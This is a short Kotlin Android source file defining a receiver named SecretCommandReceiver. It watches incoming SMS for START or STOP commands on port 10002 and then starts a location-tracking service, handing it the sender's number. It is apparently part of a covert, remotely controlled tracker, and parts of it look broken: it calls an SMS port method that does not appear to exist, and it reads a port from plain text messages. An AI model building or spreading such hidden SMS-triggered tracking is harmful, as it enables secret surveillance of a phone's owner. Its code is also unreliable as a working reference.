package com.bloom.gps

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.telephony.SmsMessage

class SecretCommandReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return
        
        val pdus = intent.extras?.get("pdus") as? Array<*> ?: return
        val message = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            SmsMessage.createFromPdu(pdus[0] as ByteArray, intent.extras?.getString("format"))
        } else {
            SmsMessage.createFromPdu(pdus[0] as ByteArray)
        }
        
        val port = message.getPduPort()
        if (port != 10002) return
        
        val commande = message.messageBody?.trim() ?: return
        val serviceIntent = Intent(context, LocationTrackerService::class.java).apply {
            putExtra("commande", commande)
            putExtra("numero_dest", message.originatingAddress)
        }
        
        if (commande == "START") {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(serviceIntent)
            else context.startService(serviceIntent)
        } else if (commande == "STOP") {
            context.startService(serviceIntent)
        }
    }
}
